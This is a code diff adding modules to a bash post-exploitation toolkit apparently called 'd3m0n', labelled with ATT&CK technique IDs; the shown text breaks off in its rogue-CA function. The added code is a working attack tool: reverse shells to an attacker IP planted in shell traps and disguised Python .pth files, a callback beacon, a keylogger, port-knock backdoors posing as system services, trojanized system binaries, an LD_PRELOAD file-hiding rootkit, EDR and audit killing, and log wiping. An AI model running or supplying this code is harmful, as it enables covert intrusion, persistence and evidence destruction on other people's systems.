@@ -1254,6 +1254,1506 @@ SEEDEOF
     sleep 1; clear
 }
 
+trapPersist(){
+    echo " [*] T1546.005 — Trap Command Persistence [*]"
+    echo ""
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
+    TRAP_MARKER="# D3M0N_TRAP"
+    BACKUP_SUFFIX=".d3m0n_trap_bak"
+
+    _inject_trap() {
+        local profile="$1" trap_type="$2" payload="$3" desc="$4"
+        [[ ! -f "$profile" ]] && touch "$profile"
+        grep -q "$TRAP_MARKER" "$profile" 2>/dev/null && { echo -e "${YELLOW}  [!] Already in ${profile}${NC}"; return 1; }
+        local orig_ts; orig_ts=$(stat -c %Y "$profile" 2>/dev/null)
+        cp "$profile" "${profile}${BACKUP_SUFFIX}" 2>/dev/null
+        printf '\n%s_%s\n# System event handler — %s\ntrap '\''%s'\'' %s\n' "$TRAP_MARKER" "$trap_type" "$desc" "$payload" "$trap_type" >> "$profile"
+        [[ -n "$orig_ts" ]] && touch -d "@${orig_ts}" "$profile" 2>/dev/null
+        echo -e "${GREEN}  [+] ${trap_type} trap injected into ${profile}${NC}"
+    }
+
+    _pick_profile() {
+        echo "  [1] ~/.bashrc  [2] ~/.bash_profile  [3] /etc/profile  [4] Custom"
+        read -p "Profile: " pc
+        case "$pc" in
+            1) echo "$HOME/.bashrc" ;; 2) echo "$HOME/.bash_profile" ;; 3) echo "/etc/profile" ;;
+            4) read -p "Path: " cp; echo "$cp" ;; *) echo "" ;;
+        esac
+    }
+
+    echo -e "  ${CYAN}[1]${NC} DEBUG trap (every command)  ${CYAN}[2]${NC} EXIT trap (shell close)"
+    echo -e "  ${CYAN}[3]${NC} ERR trap (on errors)        ${CYAN}[4]${NC} RETURN trap"
+    echo -e "  ${CYAN}[5]${NC} Preset: Revshell on EXIT    ${CYAN}[6]${NC} Preset: Keylogger via DEBUG"
+    echo -e "  ${CYAN}[7]${NC} Cleanup"
+    read -p "Choice [1-7]: " OPT
+    case "$OPT" in
+        1) read -p "Payload: " PL; P=$(_pick_profile); [[ -n "$P" ]] && _inject_trap "$P" DEBUG "$PL" "debug hooks" ;;
+        2) read -p "Payload: " PL; P=$(_pick_profile); [[ -n "$P" ]] && _inject_trap "$P" EXIT "$PL" "cleanup handler" ;;
+        3) read -p "Payload: " PL; P=$(_pick_profile); [[ -n "$P" ]] && _inject_trap "$P" ERR "$PL" "error handler" ;;
+        4) read -p "Payload: " PL; P=$(_pick_profile); [[ -n "$P" ]] && _inject_trap "$P" RETURN "$PL" "return handler" ;;
+        5)
+            read -p "Attacker IP: " LH; read -p "Port: " LP
+            PL="nohup bash -c 'sleep 3 && bash -i >& /dev/tcp/${LH}/${LP} 0>&1' &>/dev/null &"
+            echo "  [1] ~/.bashrc  [2] /etc/profile"; read -p "Choice: " pc
+            P="$HOME/.bashrc"; [[ "$pc" == "2" ]] && P="/etc/profile"
+            _inject_trap "$P" EXIT "$PL" "cleanup handler"
+            ;;
+        6)
+            LF="/tmp/.$(cat /dev/urandom | tr -dc 'a-z' | head -c8)"
+            PL="echo \"\$(date +%s) \$(whoami) \$(pwd) \$BASH_COMMAND\" >> ${LF}"
+            echo "  [1] ~/.bashrc  [2] /etc/profile"; read -p "Choice: " pc
+            P="$HOME/.bashrc"; [[ "$pc" == "2" ]] && P="/etc/profile"
+            _inject_trap "$P" DEBUG "$PL" "debug hooks"
+            echo -e "${GREEN}[+] Keylogger → ${LF}${NC}"
+            ;;
+        7)
+            for p in "$HOME/.bashrc" "$HOME/.bash_profile" "$HOME/.profile" "$HOME/.zshrc" "/etc/profile"; do
+                if [[ -f "$p" ]] && grep -q "$TRAP_MARKER" "$p" 2>/dev/null; then
+                    if [[ -f "${p}${BACKUP_SUFFIX}" ]]; then cp "${p}${BACKUP_SUFFIX}" "$p"; rm -f "${p}${BACKUP_SUFFIX}"
+                    else sed -i "/${TRAP_MARKER}/,+2d" "$p"; fi
+                    echo -e "${GREEN}  [+] Cleaned: ${p}${NC}"
+                fi
+            done
+            ;;
+        *) echo "[ERROR] Invalid" ;;
+    esac
+}
+
+pythonPersist(){
+    echo " [*] T1546.018 — Python Startup Hooks [*]"
+    echo ""
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
+    MARKER="# d3m0n_python_hook"
+
+    _find_sp() {
+        for pybin in python3 python; do
+            command -v "$pybin" &>/dev/null || continue
+            "$pybin" -c "import site; print(site.getsitepackages()[0])" 2>/dev/null
+        done | sort -u
+    }
+
+    echo -e "  ${CYAN}[1]${NC} .pth file injection     ${CYAN}[2]${NC} usercustomize.py (per-user)"
+    echo -e "  ${CYAN}[3]${NC} sitecustomize.py (root)  ${CYAN}[4]${NC} Stealth .pth revshell"
+    echo -e "  ${CYAN}[5]${NC} Cleanup"
+    read -p "Choice [1-5]: " OPT
+    case "$OPT" in
+        1)
+            read -p "Python payload: " PL; read -p ".pth name [system-path-config]: " PN
+            PN="${PN:-system-path-config}"
+            SP=$(_find_sp | head -1)
+            [[ -z "$SP" ]] && { echo "No site-packages found."; return; }
+            mkdir -p "$SP" 2>/dev/null
+            echo "import os; os.system('${PL}')" > "${SP}/${PN}.pth"
+            echo "$MARKER" >> "${SP}/${PN}.pth"
+            chmod 644 "${SP}/${PN}.pth"
+            echo -e "${GREEN}[+] Created: ${SP}/${PN}.pth${NC}"
+            ;;
+        2)
+            read -p "Callback URL: " CB
+            USP=$(python3 -c "import site; print(site.getusersitepackages())" 2>/dev/null)
+            USP="${USP:-$HOME/.local/lib/python3/dist-packages}"
+            mkdir -p "$USP" 2>/dev/null
+            cat > "${USP}/usercustomize.py" << PYEOF
+${MARKER}
+import os, socket
+try: os.system('curl -s ${CB}/beacon?host=' + socket.gethostname() + ' &')
+except: pass
+PYEOF
+            echo -e "${GREEN}[+] Created: ${USP}/usercustomize.py${NC}"
+            ;;
+        3)
+            [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+            read -p "Python payload (one line): " PL
+            for sp in $(_find_sp); do
+                [[ -d "$sp" ]] || continue
+                echo -e "${MARKER}\n${PL}" >> "${sp}/sitecustomize.py"
+                echo -e "${GREEN}  [+] Injected: ${sp}/sitecustomize.py${NC}"
+            done
+            ;;
+        4)
+            read -p "Revshell IP: " LH; read -p "Port: " LP
+            SP=$(_find_sp | head -1)
+            [[ -z "$SP" ]] && { echo "No site-packages."; return; }
+            local NAMES=("_distutils_hack" "certifi-paths" "easy-install" "pkg_resources_init")
+            local N="${NAMES[$((RANDOM % ${#NAMES[@]}))]}"
+            echo "import os; os.system('(nohup bash -c \"bash -i >& /dev/tcp/${LH}/${LP} 0>&1\" &>/dev/null &) 2>/dev/null')" > "${SP}/${N}.pth"
+            echo -e "${GREEN}[+] Stealth .pth: ${SP}/${N}.pth${NC}"
+            ;;
+        5)
+            for sp in $(_find_sp); do
+                for f in "$sp"/*.pth; do [[ -f "$f" ]] && grep -q "$MARKER" "$f" && rm -f "$f" && echo "Removed: $f"; done
+                for f in usercustomize.py sitecustomize.py; do
+                    [[ -f "${sp}/${f}" ]] && grep -q "$MARKER" "${sp}/${f}" && rm -f "${sp}/${f}" && echo "Removed: ${sp}/${f}"
+                done
+            done
+            ;;
+    esac
+}
+
+socketFilter(){
+    echo " [*] T1205.002 — Port Knocking / Socket Filter [*]"
+    echo ""
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
+    KNOCK_DIR="/etc/.d3m0n_knock"
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+
+    echo -e "  ${CYAN}[1]${NC} Classic port knock (iptables)"
+    echo -e "  ${CYAN}[2]${NC} Single-packet auth (magic string)"
+    echo -e "  ${CYAN}[3]${NC} ICMP knock (ping sizes)"
+    echo -e "  ${CYAN}[4]${NC} Cleanup"
+    read -p "Choice [1-4]: " OPT
+    case "$OPT" in
+        1)
+            read -p "Knock ports (space-sep, e.g. '7000 8000 9000'): " KS
+            read -p "Protected port (e.g. 22): " PP
+            read -p "Open duration secs [30]: " OT; OT="${OT:-30}"
+            local -a PORTS=($KS); local NP=${#PORTS[@]}; local i=1
+            iptables-save > "${KNOCK_DIR}/iptables.bak" 2>/dev/null
+            mkdir -p "$KNOCK_DIR" 2>/dev/null
+            iptables -A INPUT -p tcp --dport "$PP" -j DROP 2>/dev/null
+            for port in "${PORTS[@]}"; do
+                if [[ $i -eq 1 ]]; then iptables -A INPUT -p tcp --dport "$port" -m recent --name KNOCK1 --set -j DROP
+                elif [[ $i -eq $NP ]]; then
+                    iptables -I INPUT -p tcp --dport "$PP" -m recent --name "KNOCK${i}" --rcheck --seconds "$OT" -j ACCEPT
+                    iptables -A INPUT -p tcp --dport "$port" -m recent --name "KNOCK$((i-1))" --rcheck --seconds 10 -m recent --name "KNOCK${i}" --set -j DROP
+                else iptables -A INPUT -p tcp --dport "$port" -m recent --name "KNOCK$((i-1))" --rcheck --seconds 10 -m recent --name "KNOCK${i}" --set -j DROP
+                fi; i=$((i+1))
+            done
+            echo -e "${GREEN}[+] Port knock: ${KS} → port ${PP}${NC}"
+            ;;
+        2)
+            read -p "Listen port [53]: " SP; SP="${SP:-53}"
+            read -p "Magic string: " MS
+            read -p "Action [1=SSH 2=Revshell 3=Custom]: " AC
+            local ACMD=""
+            case "$AC" in
+                1) ACMD="iptables -I INPUT -p tcp --dport 22 -j ACCEPT; sleep 60; iptables -D INPUT -p tcp --dport 22 -j ACCEPT" ;;
+                2) read -p "Host:Port: " RS; ACMD="bash -i >& /dev/tcp/${RS%%:*}/${RS##*:} 0>&1" ;;
+                3) read -p "Command: " ACMD ;;
+            esac
+            mkdir -p "$KNOCK_DIR" 2>/dev/null
+            cat > "${KNOCK_DIR}/spa_listener.sh" << SEOF
+#!/bin/bash
+while true; do DATA=\$(ncat -l -p "${SP}" -w 5 2>/dev/null || nc -l -p "${SP}" -w 5 2>/dev/null)
+[[ "\$DATA" == *"${MS}"* ]] && { ${ACMD} & }; done
+SEOF
+            chmod 700 "${KNOCK_DIR}/spa_listener.sh"
+            cat > /etc/systemd/system/d3m0n-spa.service << SVEOF
+[Unit]
+Description=System Packet Analyzer
+After=network.target
+[Service]
+Type=simple
+ExecStart=/bin/bash ${KNOCK_DIR}/spa_listener.sh
+Restart=always
+[Install]
+WantedBy=multi-user.target
+SVEOF
+            systemctl daemon-reload && systemctl enable --now d3m0n-spa.service 2>/dev/null
+            echo -e "${GREEN}[+] SPA on port ${SP}. Auth: echo '${MS}' | nc -w1 TARGET ${SP}${NC}"
+            ;;
+        3)
+            read -p "ICMP sizes (space-sep, e.g. '64 128 256'): " IS
+            read -p "Action [1=SSH 2=Revshell 3=Custom]: " AC
+            local ACMD=""
+            case "$AC" in
+                1) ACMD="iptables -I INPUT -p tcp --dport 22 -j ACCEPT; sleep 60; iptables -D INPUT -p tcp --dport 22 -j ACCEPT" ;;
+                2) read -p "Host:Port: " RS; ACMD="bash -i >& /dev/tcp/${RS%%:*}/${RS##*:} 0>&1" ;;
+                3) read -p "Command: " ACMD ;;
+            esac
+            mkdir -p "$KNOCK_DIR" 2>/dev/null
+            cat > "${KNOCK_DIR}/icmp_knock.sh" << 'IKEOF'
+#!/bin/bash
+EXPECTED=(SIZES_PH); ACTION="ACTION_PH"; STATE=0; LT=$(date +%s)
+tcpdump -lni any icmp 2>/dev/null | while IFS= read -r line; do
+SZ=$(echo "$line"|grep -oP 'length \K[0-9]+'); [[ -z "$SZ" ]] && continue
+NOW=$(date +%s); (( NOW-LT>10 )) && STATE=0; LT=$NOW
+[[ "$SZ" == "${EXPECTED[$STATE]}" ]] && STATE=$((STATE+1))
+[[ $STATE -eq ${#EXPECTED[@]} ]] && { eval "$ACTION" &; STATE=0; }
+done
+IKEOF
+            sed -i "s|SIZES_PH|${IS}|;s|ACTION_PH|${ACMD}|" "${KNOCK_DIR}/icmp_knock.sh"
+            chmod 700 "${KNOCK_DIR}/icmp_knock.sh"
+            cat > /etc/systemd/system/d3m0n-icmpknock.service << SVEOF
+[Unit]
+Description=ICMP Network Monitor
+After=network.target
+[Service]
+Type=simple
+ExecStart=/bin/bash ${KNOCK_DIR}/icmp_knock.sh
+Restart=always
+[Install]
+WantedBy=multi-user.target
+SVEOF
+            systemctl daemon-reload && systemctl enable --now d3m0n-icmpknock.service 2>/dev/null
+            echo -e "${GREEN}[+] ICMP knock active. Sizes: ${IS}${NC}"
+            ;;
+        4)
+            systemctl stop d3m0n-spa d3m0n-icmpknock 2>/dev/null
+            systemctl disable d3m0n-spa d3m0n-icmpknock 2>/dev/null
+            rm -f /etc/systemd/system/d3m0n-spa.service /etc/systemd/system/d3m0n-icmpknock.service
+            [[ -f "${KNOCK_DIR}/iptables.bak" ]] && iptables-restore < "${KNOCK_DIR}/iptables.bak"
+            rm -rf "$KNOCK_DIR"; systemctl daemon-reload 2>/dev/null
+            echo -e "${GREEN}[+] Knock services removed.${NC}"
+            ;;
+    esac
+}
+
+binaryReplace(){
+    echo " [*] T1554 — Trojanize System Binaries [*]"
+    echo ""
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
+    HIDE_DIR="/usr/lib/.d3m0n_orig"
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+
+    echo -e "  ${CYAN}[1]${NC} Replace binaries (filter attacker artifacts)"
+    echo -e "  ${CYAN}[2]${NC} Restore originals"
+    echo -e "  ${CYAN}[3]${NC} Status check"
+    read -p "Choice [1-3]: " OPT
+    case "$OPT" in
+        1)
+            read -p "Hide prefix (files/dirs starting with this are hidden) [.d3m0n]: " HPFX
+            HPFX="${HPFX:-.d3m0n}"
+            read -p "Hide PID (process name to hide, e.g. 'backdoor') [none]: " HPID
+            read -p "Hide user [none]: " HUSR
+            read -p "Hide connection port [none]: " HPORT
+            mkdir -p "$HIDE_DIR" 2>/dev/null
+            chmod 700 "$HIDE_DIR"
+            BINS=(ls find ps netstat ss who w last lsof)
+            for bin in "${BINS[@]}"; do
+                BPATH=$(command -v "$bin" 2>/dev/null); [[ -z "$BPATH" ]] && continue
+                [[ -f "${HIDE_DIR}/$(basename "$BPATH")" ]] && continue
+                cp "$BPATH" "${HIDE_DIR}/$(basename "$BPATH")"
+                cat > "$BPATH" << WEOF
+#!/bin/bash
+ORIG="${HIDE_DIR}/$(basename "$BPATH")"
+OUTPUT=\$("\$ORIG" "\$@" 2>&1)
+WEOF
+                [[ -n "$HPFX" ]] && echo "OUTPUT=\$(echo \"\$OUTPUT\" | grep -v \"${HPFX}\")" >> "$BPATH"
+                [[ -n "$HPID" ]] && echo "OUTPUT=\$(echo \"\$OUTPUT\" | grep -v \"${HPID}\")" >> "$BPATH"
+                [[ -n "$HUSR" ]] && echo "OUTPUT=\$(echo \"\$OUTPUT\" | grep -v \"${HUSR}\")" >> "$BPATH"
+                [[ -n "$HPORT" ]] && echo "OUTPUT=\$(echo \"\$OUTPUT\" | grep -v \"${HPORT}\")" >> "$BPATH"
+                echo 'echo "$OUTPUT"' >> "$BPATH"
+                chmod 755 "$BPATH"
+                echo -e "${GREEN}  [+] Replaced: ${BPATH}${NC}"
+            done
+            ;;
+        2)
+            [[ ! -d "$HIDE_DIR" ]] && { echo "No backups found."; return; }
+            for orig in "$HIDE_DIR"/*; do
+                [[ -f "$orig" ]] || continue
+                BN=$(basename "$orig"); DEST=$(command -v "$BN" 2>/dev/null || echo "/usr/bin/$BN")
+                cp "$orig" "$DEST" && chmod 755 "$DEST"
+                echo -e "${GREEN}  [+] Restored: ${DEST}${NC}"
+            done
+            rm -rf "$HIDE_DIR"
+            ;;
+        3)
+            if [[ -d "$HIDE_DIR" ]]; then
+                echo "Trojanized binaries:"; ls "$HIDE_DIR"
+            else echo "No trojanized binaries found."; fi
+            ;;
+    esac
+}
+
+ldsoPreload(){
+    echo " [*] T1574.006 — System-Wide /etc/ld.so.preload [*]"
+    echo ""
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
+    PRELOAD_DIR="/usr/lib/.d3m0n_preload"
+    SO_NAME="libsystem_helper.so"
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+
+    echo -e "  ${CYAN}[1]${NC} Install (compile & deploy .so)"
+    echo -e "  ${CYAN}[2]${NC} Uninstall"
+    echo -e "  ${CYAN}[3]${NC} Status"
+    read -p "Choice [1-3]: " OPT
+    case "$OPT" in
+        1)
+            command -v gcc &>/dev/null || { echo "gcc required."; return; }
+            read -p "Hide file prefix [.d3m0n]: " HPFX; HPFX="${HPFX:-.d3m0n}"
+            read -p "Hide process name [none]: " HPROC
+            mkdir -p "$PRELOAD_DIR" 2>/dev/null
+            cat > "${PRELOAD_DIR}/preload.c" << 'CEOF'
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <dlfcn.h>
+#include <dirent.h>
+
+#ifndef HIDE_PREFIX
+#define HIDE_PREFIX ".d3m0n"
+#endif
+
+struct dirent *readdir(DIR *dirp) {
+    struct dirent *(*orig_readdir)(DIR *) = dlsym(RTLD_NEXT, "readdir");
+    struct dirent *entry;
+    while ((entry = orig_readdir(dirp)) != NULL) {
+        if (strstr(entry->d_name, HIDE_PREFIX) != NULL) continue;
+        break;
+    }
+    return entry;
+}
+
+struct dirent64 *readdir64(DIR *dirp) {
+    struct dirent64 *(*orig_readdir64)(DIR *) = dlsym(RTLD_NEXT, "readdir64");
+    struct dirent64 *entry;
+    while ((entry = orig_readdir64(dirp)) != NULL) {
+        if (strstr(entry->d_name, HIDE_PREFIX) != NULL) continue;
+        break;
+    }
+    return entry;
+}
+CEOF
+            gcc -shared -fPIC -o "${PRELOAD_DIR}/${SO_NAME}" "${PRELOAD_DIR}/preload.c" \
+                -ldl -DHIDE_PREFIX="\"${HPFX}\"" 2>/dev/null
+            if [[ $? -eq 0 ]]; then
+                echo "${PRELOAD_DIR}/${SO_NAME}" >> /etc/ld.so.preload
+                echo -e "${GREEN}[+] Installed: ${PRELOAD_DIR}/${SO_NAME} → /etc/ld.so.preload${NC}"
+            else echo -e "${RED}[!] Compilation failed.${NC}"; fi
+            ;;
+        2)
+            sed -i "\|${PRELOAD_DIR}|d" /etc/ld.so.preload 2>/dev/null
+            rm -rf "$PRELOAD_DIR"
+            [[ ! -s /etc/ld.so.preload ]] && rm -f /etc/ld.so.preload
+            echo -e "${GREEN}[+] Removed.${NC}"
+            ;;
+        3)
+            if grep -q "$PRELOAD_DIR" /etc/ld.so.preload 2>/dev/null; then
+                echo -e "${GREEN}Active: $(grep "$PRELOAD_DIR" /etc/ld.so.preload)${NC}"
+            else echo "Not installed."; fi
+            ;;
+    esac
+}
+
+systemdTimerPersist(){
+    echo " [*] T1053.006 — Systemd Timer Persistence [*]"
+    echo ""
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+
+    echo -e "  ${CYAN}[1]${NC} Create persistent timer"
+    echo -e "  ${CYAN}[2]${NC} List d3m0n timers"
+    echo -e "  ${CYAN}[3]${NC} Remove timer"
+    read -p "Choice [1-3]: " OPT
+    case "$OPT" in
+        1)
+            read -p "Timer name (e.g. system-maintenance): " TN; TN="${TN:-system-maintenance}"
+            read -p "Interval [1=Every 15min 2=Hourly 3=Daily 4=On boot 5=Custom]: " IV
+            local ONCAL="" ONBOOT=""
+            case "$IV" in
+                1) ONCAL="*:0/15" ;; 2) ONCAL="hourly" ;; 3) ONCAL="daily" ;;
+                4) ONBOOT="120" ;; 5) read -p "OnCalendar= " ONCAL ;;
+            esac
+            read -p "Command to execute: " CMD
+            [[ -z "$CMD" ]] && { echo "Command required."; return; }
+            cat > "/etc/systemd/system/${TN}.service" << SVEOF
+[Unit]
+Description=System Maintenance Task
+[Service]
+Type=oneshot
+ExecStart=/bin/bash -c '${CMD}'
+SVEOF
+            local TIMER_CONTENT="[Unit]\nDescription=System Maintenance Schedule\n[Timer]\n"
+            [[ -n "$ONCAL" ]] && TIMER_CONTENT+="OnCalendar=${ONCAL}\n"
+            [[ -n "$ONBOOT" ]] && TIMER_CONTENT+="OnBootSec=${ONBOOT}\nOnUnitActiveSec=${ONBOOT}\n"
+            TIMER_CONTENT+="RandomizedDelaySec=30\nPersistent=true\n[Install]\nWantedBy=timers.target"
+            echo -e "$TIMER_CONTENT" > "/etc/systemd/system/${TN}.timer"
+            systemctl daemon-reload && systemctl enable --now "${TN}.timer" 2>/dev/null
+            echo -e "${GREEN}[+] Timer ${TN} active.${NC}"
+            ;;
+        2)
+            echo "Active d3m0n-style timers:"; systemctl list-timers --all 2>/dev/null | head -20
+            ;;
+        3)
+            read -p "Timer name to remove: " TN
+            systemctl stop "${TN}.timer" 2>/dev/null; systemctl disable "${TN}.timer" 2>/dev/null
+            rm -f "/etc/systemd/system/${TN}.timer" "/etc/systemd/system/${TN}.service"
+            systemctl daemon-reload 2>/dev/null
+            echo -e "${GREEN}[+] Timer ${TN} removed.${NC}"
+            ;;
+    esac
+}
+
+defenseImpair(){
+    echo " [*] T1562 — Impair Defenses Suite [*]"
+    echo ""
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+
+    echo -e "  ${CYAN}[1]${NC} Disable SELinux          ${CYAN}[2]${NC} Disable AppArmor"
+    echo -e "  ${CYAN}[3]${NC} Tamper auditd            ${CYAN}[4]${NC} Kill history logging"
+    echo -e "  ${CYAN}[5]${NC} Disable firewall         ${CYAN}[6]${NC} Disable syslog/journald"
+    echo -e "  ${CYAN}[7]${NC} Kill EDR agents          ${CYAN}[8]${NC} ALL of the above"
+    read -p "Choice [1-8]: " OPT
+
+    _disable_selinux() {
+        command -v setenforce &>/dev/null && setenforce 0
+        [[ -f /etc/selinux/config ]] && sed -i 's/^SELINUX=.*/SELINUX=disabled/' /etc/selinux/config
+        echo -e "${GREEN}  [+] SELinux disabled${NC}"
+    }
+    _disable_apparmor() {
+        systemctl stop apparmor 2>/dev/null; systemctl disable apparmor 2>/dev/null
+        command -v aa-teardown &>/dev/null && aa-teardown 2>/dev/null
+        echo -e "${GREEN}  [+] AppArmor disabled${NC}"
+    }
+    _tamper_auditd() {
+        systemctl stop auditd 2>/dev/null; auditctl -e 0 2>/dev/null; auditctl -D 2>/dev/null
+        echo -e "${GREEN}  [+] Auditd disabled & rules cleared${NC}"
+    }
+    _kill_history() {
+        export HISTSIZE=0 HISTFILESIZE=0
+        unset HISTFILE
+        echo "export HISTCONTROL=ignoreboth" >> /etc/profile
+        echo "HISTSIZE=0" >> /etc/profile
+        ln -sf /dev/null "$HOME/.bash_history" 2>/dev/null
+        echo -e "${GREEN}  [+] History logging impaired${NC}"
+    }
+    _disable_fw() {
+        command -v ufw &>/dev/null && ufw disable 2>/dev/null
+        iptables -F 2>/dev/null; iptables -X 2>/dev/null; iptables -P INPUT ACCEPT; iptables -P FORWARD ACCEPT; iptables -P OUTPUT ACCEPT
+        echo -e "${GREEN}  [+] Firewall disabled${NC}"
+    }
+    _disable_syslog() {
+        systemctl stop rsyslog syslog-ng 2>/dev/null; systemctl disable rsyslog syslog-ng 2>/dev/null
+        sed -i 's/^#*Storage=.*/Storage=none/' /etc/systemd/journald.conf 2>/dev/null
+        systemctl restart systemd-journald 2>/dev/null
+        echo -e "${GREEN}  [+] Syslog/journald impaired${NC}"
+    }
+    _kill_edr() {
+        local AGENTS=("falcon-sensor" "cbagentd" "wazuh-agent" "ossec" "mdatp" "clamd")
+        for a in "${AGENTS[@]}"; do
+            systemctl stop "$a" 2>/dev/null; pkill -9 -f "$a" 2>/dev/null
+        done
+        echo -e "${GREEN}  [+] EDR agents killed${NC}"
+    }
+
+    case "$OPT" in
+        1) _disable_selinux ;; 2) _disable_apparmor ;; 3) _tamper_auditd ;;
+        4) _kill_history ;; 5) _disable_fw ;; 6) _disable_syslog ;; 7) _kill_edr ;;
+        8) _disable_selinux; _disable_apparmor; _tamper_auditd; _kill_history; _disable_fw; _disable_syslog; _kill_edr ;;
+        *) echo "[ERROR] Invalid" ;;
+    esac
+}
+
+antiForensics(){
+    echo " [*] T1070 — Anti-Forensics / Indicator Removal [*]"
+    echo ""
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+
+    echo -e "  ${CYAN}[1]${NC} Timestomp files          ${CYAN}[2]${NC} Wipe logs"
+    echo -e "  ${CYAN}[3]${NC} Destroy shell history    ${CYAN}[4]${NC} Secure file deletion"
+    echo -e "  ${CYAN}[5]${NC} Clear persistence traces ${CYAN}[6]${NC} Full cleanup (all)"
+    read -p "Choice [1-6]: " OPT
+
+    _timestomp() {
+        read -p "File to timestomp: " TF; read -p "Reference file (copy timestamps from): " RF
+        [[ -f "$TF" && -f "$RF" ]] && touch -r "$RF" "$TF" && echo -e "${GREEN}  [+] Timestomped: ${TF}${NC}" || echo "Files not found."
+    }
+    _wipe_logs() {
+        for log in /var/log/auth.log /var/log/syslog /var/log/messages /var/log/secure /var/log/kern.log /var/log/daemon.log; do
+            [[ -f "$log" ]] && cat /dev/null > "$log"
+        done
+        cat /dev/null > /var/log/wtmp 2>/dev/null; cat /dev/null > /var/log/btmp 2>/dev/null
+        cat /dev/null > /var/log/lastlog 2>/dev/null; cat /dev/null > /var/run/utmp 2>/dev/null
+        journalctl --vacuum-size=1K 2>/dev/null
+        echo -e "${GREEN}  [+] Logs wiped${NC}"
+    }
+    _destroy_history() {
+        for hf in "$HOME/.bash_history" "$HOME/.zsh_history" "$HOME/.sh_history" "/root/.bash_history"; do
+            [[ -f "$hf" ]] && shred -zu "$hf" 2>/dev/null || rm -f "$hf"
+        done
+        for u in /home/*; do
+            [[ -d "$u" ]] || continue
+            for hf in "$u/.bash_history" "$u/.zsh_history"; do
+                [[ -f "$hf" ]] && shred -zu "$hf" 2>/dev/null
+            done
+        done
+        history -c 2>/dev/null
+        echo -e "${GREEN}  [+] History destroyed${NC}"
+    }
+    _secure_delete() {
+        read -p "File/directory to securely delete: " TD
+        if [[ -d "$TD" ]]; then find "$TD" -type f -exec shred -zu {} \; 2>/dev/null; rm -rf "$TD"
+        elif [[ -f "$TD" ]]; then shred -zu "$TD" 2>/dev/null
+        else echo "Not found."; return; fi
+        echo -e "${GREEN}  [+] Securely deleted: ${TD}${NC}"
+    }
+    _clear_traces() {
+        for f in /etc/cron.d/d3m0n* /etc/systemd/system/d3m0n* /etc/.d3m0n*; do
+            [[ -e "$f" ]] && rm -rf "$f" && echo "  Removed: $f"
+        done
+        systemctl daemon-reload 2>/dev/null
+        echo -e "${GREEN}  [+] Persistence traces cleared${NC}"
+    }
+
+    case "$OPT" in
+        1) _timestomp ;; 2) _wipe_logs ;; 3) _destroy_history ;; 4) _secure_delete ;; 5) _clear_traces ;;
+        6) _wipe_logs; _destroy_history; _clear_traces; echo -e "${GREEN}[+] Full cleanup done.${NC}" ;;
+        *) echo "[ERROR] Invalid" ;;
+    esac
+}
+
+rogueCA(){
+    echo " [*] T1553.004 — Rogue Certificate Authority [*]"
+    echo ""
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
+    CA_DIR="/etc/.d3m0n_ca"
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    command -v openssl &>/dev/null || { echo "openssl required."; return; }
+
+    echo -e "  ${CYAN}[1]${NC} Generate & install rogue CA"
+    echo -e "  ${CYAN}[2]${NC} Generate leaf cert for domain"
+    echo -e "  ${CYAN}[3]${NC} Remove rogue CA"
+    read -p "Choice [1-3]: " OPT
+    case "$OPT" in
+        1)
+            read -p "CA Common Name [System Update Authority]: " CN; CN="${CN:-System Update Authority}"
+            mkdir -p "$CA_DIR" 2>/dev/null; chmod 700 "$CA_DIR"
+            openssl genrsa -out "${CA_DIR}/ca.key" 4096 2>/dev/null
+            openssl req -new -x509 -days 3650 -key "${CA_DIR}/ca.key" -out "${CA_DIR}/ca.crt" \
+                -subj "/C=US/ST=CA/O=System/CN=${CN}" 2>/dev/null
+            if [[ -d /usr/local/share/ca-certificates ]]; then
+                cp "${CA_DIR}/ca.crt" /usr/local/share/ca-certificates/system-update-ca.crt
+                update-ca-certificates 2>/dev/null
+            elif [[ -d /etc/pki/ca-trust/source/anchors ]]; then
+                cp "${CA_DIR}/ca.crt" /etc/pki/ca-trust/source/anchors/system-update-ca.crt
+                update-ca-trust 2>/dev/null
+            fi
+            echo -e "${GREEN}[+] Rogue CA installed: ${CN}${NC}"
+            ;;
+        2)
+            [[ ! -f "${CA_DIR}/ca.key" ]] && { echo "Generate CA first."; return; }
+            read -p "Domain (e.g. example.com): " DOMAIN
+            openssl genrsa -out "${CA_DIR}/${DOMAIN}.key" 2048 2>/dev/null
+            openssl req -new -key "${CA_DIR}/${DOMAIN}.key" -out "${CA_DIR}/${DOMAIN}.csr" \
+                -subj "/C=US/ST=CA/O=System/CN=${DOMAIN}" 2>/dev/null
+            openssl x509 -req -days 365 -in "${CA_DIR}/${DOMAIN}.csr" \
+                -CA "${CA_DIR}/ca.crt" -CAkey "${CA_DIR}/ca.key" -CAcreateserial \
+                -out "${CA_DIR}/${DOMAIN}.crt" 2>/dev/null
